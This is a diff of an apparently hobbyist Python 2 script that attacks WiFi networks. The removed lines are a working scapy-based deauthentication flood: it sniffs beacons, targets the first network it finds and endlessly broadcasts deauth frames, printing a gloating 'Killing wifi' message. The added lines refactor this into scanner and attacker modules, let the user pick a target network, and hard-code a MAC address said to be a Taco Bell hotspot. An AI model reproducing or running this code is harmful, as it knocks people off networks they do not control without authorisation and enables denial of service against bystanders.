@@ -1,52 +1,40 @@
 #!/usr/bin/env python2
-import scapy.all
 
-import os,sys,signal
 import time
-ips = []
+from scanner import Scanner 
+from attacker import Attacker
 
-import threading
+# Taco bell wifi hard coded for the example - remove this
+WIFI = 'c8:d7:19:5d:df:9b'
 
-def handler(p):
-    if (p.haslayer(scapy.all.Dot11Beacon)):
-        ssid = p[scapy.all.Dot11Elt].info
-        bssid = p[scapy.all.Dot11].addr3
+scanner = Scanner()
+with scanner as s:
+    print 'scanning networks'
+    s.scanNetworks()
 
-        if bssid not in ips:
-            ips.append(bssid)
-            
-t = threading.Thread(target=scapy.all.sniff, kwargs={'iface':"wlo1mon",'prn': handler})
-t.daemon = True
-t.start()
+    # create the attacker obj
+    #   gotta pass in the monitor_iface from the scanner
+    #   to make it work
+    attacker = Attacker(s.monitor_iface)
+    attacker.startAttack()
 
-def process():
-    found = 0
-    while True:
-        if len(ips) > found:
-            found = len(ips)
-            time.sleep(1)
+    i = 1
+    for item in s.networks.keys():
+        print " " + str(i) + ") " + str(item)
+        i += 1
+    network = raw_input("select network: ")
+    networks = [s.networks.keys()[int(network) - 1]]
 
-thread2 = threading.Thread(target=process)
-thread2.daemon = True
-thread2.start()
+    attacker.updateQueue(networks)
+    time.sleep(15)
 
-while len(ips) == 0:
-    time.sleep(1)
+    networks = [s.networks.keys()[int(network) - 1], WIFI]
+    attacker.updateQueue(networks)
 
-print "Found " + str(len(ips)) + " networks."
+    time.sleep(15)
 
-# we have found at least one whoopie
-WIFI = ips[0]
-INTERFACE = "wlo1mon"
+    networks = [WIFI]
+    attacker.updateQueue(networks)
 
-
-def send_deauth(mac, mon):
-    # def makePacket(access_point,client="2c:0e:3d:0c:33:1a"):
-    def makePacket(access_point,client="ff:ff:ff:ff:ff:ff"):
-        return scapy.all.RadioTap()/scapy.all.Dot11(addr1=client, addr2=mac, addr3=mac)/scapy.all.Dot11Deauth()
-    pkt = makePacket(access_point=mac)
-    print "Killing wifi HEHEHEHHEHEHE"
-    while True:
-        scapy.all.sendp(pkt, iface=mon, count=1, inter=.2, verbose=0)
-
-send_deauth(WIFI, INTERFACE)
+    inp = raw_input('press q to quit')
+    attacker.stopAttack()
